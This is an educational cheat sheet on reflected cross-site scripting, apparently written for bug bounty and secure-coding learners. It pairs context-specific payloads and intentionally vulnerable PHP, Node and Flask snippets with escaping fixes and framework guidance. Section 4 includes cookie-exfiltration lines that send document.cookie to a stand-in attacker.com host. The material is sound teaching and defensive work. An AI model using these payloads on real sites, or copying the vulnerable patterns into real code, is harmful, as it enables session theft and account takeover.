# Module 2 — Reflected XSS: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Beginner → Intermediate  
> **Date:** 2026-05

---

## 1. Core Definition

Reflected XSS occurs when a web application takes user-supplied input from an HTTP request and **echoes it directly into the response** without proper encoding. The payload is never stored — it lives in the request and the response only.

**The three-part requirement:**
1. Application reflects user input into the page
2. Reflected output is parsed as code by the browser (not as data)
3. Victim is made to send the crafted request (clicks the link)

---

## 2. The Attack Flow

```
Attacker crafts URL
       ↓
Victim clicks link  ←── delivered via email, SMS, phishing, QR code, shortened URL
       ↓
Browser sends request to vulnerable server
       ↓
Server echoes payload into HTML response (unsanitized)
       ↓
Browser parses response — treats payload as code
       ↓
Attacker-controlled JavaScript executes in victim's browser
```

**Key rule:** No click = no request = no execution. But never use this as a defence argument — links are disguisable and users are trustworthy of sites they use.

---

## 3. Context Mapping (Do This Before Any Payload)

Inject a harmless unique probe first:

```
?q=xsstest99999
```

View source → search for `xsstest99999` → identify the exact context.

| Context | What it looks like in source | Break-out character |
|---|---|---|
| HTML text node | `<p>xsstest99999</p>` | `<` (open a tag) |
| HTML attribute (double quote) | `value="xsstest99999"` | `"` |
| HTML attribute (single quote) | `value='xsstest99999'` | `'` |
| JS string (double quote) | `var x = "xsstest99999";` | `"` |
| JS string (single quote) | `var x = 'xsstest99999';` | `'` |
| JS template literal | `` var x = `xsstest99999`; `` | `${` or `` ` `` |
| HTML comment | `<!-- xsstest99999 -->` | `-->` |
| Script block | `<script>...xsstest99999...</script>` | `</script>` |
| URL parameter | `href="/path?x=xsstest99999"` | depends on usage |

---

## 4. Payloads by Context (With Reasoning)

### HTML text node context
```html
<!-- Basic script tag -->
<script>alert(document.cookie)</script>

<!-- Event handler via broken image — no script tag needed -->
<img src=1 onerror=alert(document.domain)>

<!-- SVG-based — useful when script/img tags are filtered -->
<svg onload=alert(1)>

<!-- Body event -->
<body onload=alert(1)>
```
**Why these work:** Parser exits text mode when it hits `<`, reads a new tag, executes the handler or script.

---

### HTML attribute context (double-quoted)
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(document.cookie)
```
**Resulting HTML:**
```html
<input value="" onmouseover="alert(1)">
```
**Why it works:** `"` closes the attribute value, then a new event handler attribute is injected.

---

### HTML attribute context (single-quoted)
```
' onmouseover='alert(1)
```

---

### JavaScript string context (double-quoted)
```javascript
";alert(document.cookie);//
";alert(1);var x="
```
**Resulting JS:**
```javascript
var x = "";alert(document.cookie);//";
```
**Why it works:** `"` closes the string, `;` ends the statement, `//` comments out the broken remainder.

---

### JavaScript string context — filter bypass (quote encoded)
When `"` is filtered but `<` is not:
```
</script><script>alert(document.cookie)</script>
```
**Why it works:** The HTML parser exits script mode on `</script>` regardless of JS syntax state. A new clean script block is opened.

---

### HTML comment context
```
--> <script>alert(1)</script> <!--
```
**Resulting HTML:**
```html
<!-- comment: --> <script>alert(1)</script> <!-- -->
```

---

### Cookie exfiltration (real impact PoC)
```javascript
// Replace alert() with this to prove real data leaves the browser
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);

// Via fetch (if CSP allows)
fetch("https://attacker.com/steal?c=" + document.cookie);
```

---

## 5. Common Vulnerable Code Patterns

### PHP
```php
// VULNERABLE
echo "Hello, " . $_GET['name'];
echo "<h1>Results for: " . $_GET['q'] . "</h1>";
?>
<input value="<?php echo $input; ?>">
<script>var user = "<?php echo $username; ?>";</script>
```

### Node.js / Express
```javascript
// VULNERABLE
res.send(`<h2>Results for: ${req.query.q}</h2>`);
res.send(`<script>var x = "${req.query.q}";</script>`);
```

### Python / Flask
```python
# VULNERABLE — using Markup() bypasses Jinja2 auto-escaping
return Markup(f"<p>Hello {request.args.get('name')}</p>")
```

---

## 6. Secure Fixes by Context

### HTML context — PHP
```php
// CORRECT
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### HTML context — Node.js
```javascript
const he = require('he');
const safe = he.encode(req.query.q);
res.send(`<h2>Results for: ${safe}</h2>`);
```

### JavaScript string context — Node.js
```javascript
// JSON.stringify handles ALL edge cases — quotes, backslashes, unicode
const jsSafe = JSON.stringify(req.query.q);
res.send(`<script>var x = ${jsSafe};</script>`);
```

### Template engines — let the engine do it
```javascript
// Express + EJS (auto-escapes with <%= %>)
res.render('search', { query: req.query.q });
// In template: <h2><%= query %></h2>  ← safe
// NEVER use: <%- query %>             ← raw, unsafe
```

---

## 7. What `htmlspecialchars` / `he.encode` Actually Does

| Character | Encoded as | Effect |
|---|---|---|
| `<` | `&lt;` | Can't open a tag |
| `>` | `&gt;` | Can't close a tag |
| `"` | `&quot;` | Can't break an attribute |
| `'` | `&#039;` | Can't break a single-quoted attribute |
| `&` | `&amp;` | Can't start another entity |

The browser renders these as visible text characters — never as markup.

---

## 8. Broken "Fixes" and Why They Fail

| Developer's attempt | Why it fails |
|---|---|
| `strip_tags()` | Removes tags but not event handler attributes. `" onmouseover="alert(1)` has no tags. |
| `replace('"', '&quot;')` | Only blocks one character. Single quotes, backticks, `</script>` escapes still work. |
| Blacklisting `<script>` | Dozens of other execution vectors exist. `<img>`, `<svg>`, `<body>`, event handlers. |
| Client-side JS sanitization | Attacker sends the request directly — your client-side code never runs. |
| XSS Auditor (Chrome, removed 2019) | Bypassable. Also introduced new bugs. Wrong layer to fix the problem. |

---

## 9. Framework Default Behavior

| Technology | XSS safe by default? | Notes |
|---|---|---|
| React JSX `{}` | Yes | Auto-escapes all expressions |
| React `dangerouslySetInnerHTML` | No | Raw HTML — you own the risk |
| Angular `{{ }}` | Yes | DomSanitizer runs automatically |
| Angular `[innerHTML]` | Partial | Sanitized but bypassable with `bypassSecurityTrust*` |
| Vue `{{ }}` | Yes | Auto-escaped |
| Vue `v-html` | No | Raw HTML injection |
| Django templates | Yes | Auto-escapes by default |
| Django `mark_safe()` | No | Explicitly bypasses escaping |
| Jinja2 `{{ }}` | Yes | Auto-escapes in HTML mode |
| Jinja2 `Markup()` | No | Raw output |
| Plain PHP `echo` | No | You must escape manually |
| EJS `<%= %>` | Yes | Escaped |
| EJS `<%- %>` | No | Raw output |

---

## 10. Discovery Methodology (Step by Step)

```
1. MAP every input that appears in the response
   - URL parameters
   - Form fields
   - HTTP headers (User-Agent, Referer, X-Forwarded-For)
   - Path segments (/user/[name]/profile)
   - JSON body fields reflected in responses

2. PROBE with a unique harmless string
   ?q=xsstest99999
   View source → find all reflection points

3. IDENTIFY the context for each reflection
   (Use the context table in Section 3)

4. CHECK for encoding/filtering
   - Is < encoded to &lt;?
   - Are quotes stripped?
   - Is the output length truncated?

5. SELECT a payload appropriate for that specific context
   (Not a generic list — a context-specific choice)

6. VERIFY execution
   - Use alert(document.domain) to confirm origin
   - Use cookie exfil to demonstrate real impact

7. DOCUMENT the full reproduction steps for the report
```

---

## 11. Bug Bounty Impact Escalation

Don't just pop `alert(1)`. Demonstrate what's actually possible:

```
Low bar:    alert(1)                        → "XSS exists"
Medium bar: alert(document.cookie)          → "session data accessible"
High bar:   cookie exfil to external server → "account takeover is possible"
Top bar:    XSS on admin panel              → "privilege escalation, full app compromise"
```

---

## 12. Arguing Against "Users Shouldn't Click Suspicious Links"

When a team resists fixing reflected XSS:

- **Trust:** The link comes from a trusted domain (your own site). The user has no reason to distrust it.
- **Disguise:** URLs can be hidden behind shorteners, anchor text in HTML emails, QR codes. The victim never sees the raw payload.
- **Scale:** One crafted URL emailed to thousands = thousands of simultaneous executions. Automated and scriptable.
- **Privilege:** One click from an admin account can compromise the entire application.
- **Security cannot rely on user behavior.** That's not a security control — it's a hope.

---

## 13. Key Mental Models to Keep

> "The server is the mirror. The browser is the execution engine."

> "Context determines everything. Same input, five different contexts, five different attacks."

> "Removing tags is not the same as making data safe. Only context-aware encoding solves XSS."

> "The payload doesn't need to be stored to be dangerous. Scale and delivery make reflected XSS a real threat."

---

## Coming Up — Module 3: Stored XSS

- Payload lives in the database
- Executes for every user who views the page
- No crafted link needed
- Higher severity, broader impact
- Different discovery methodology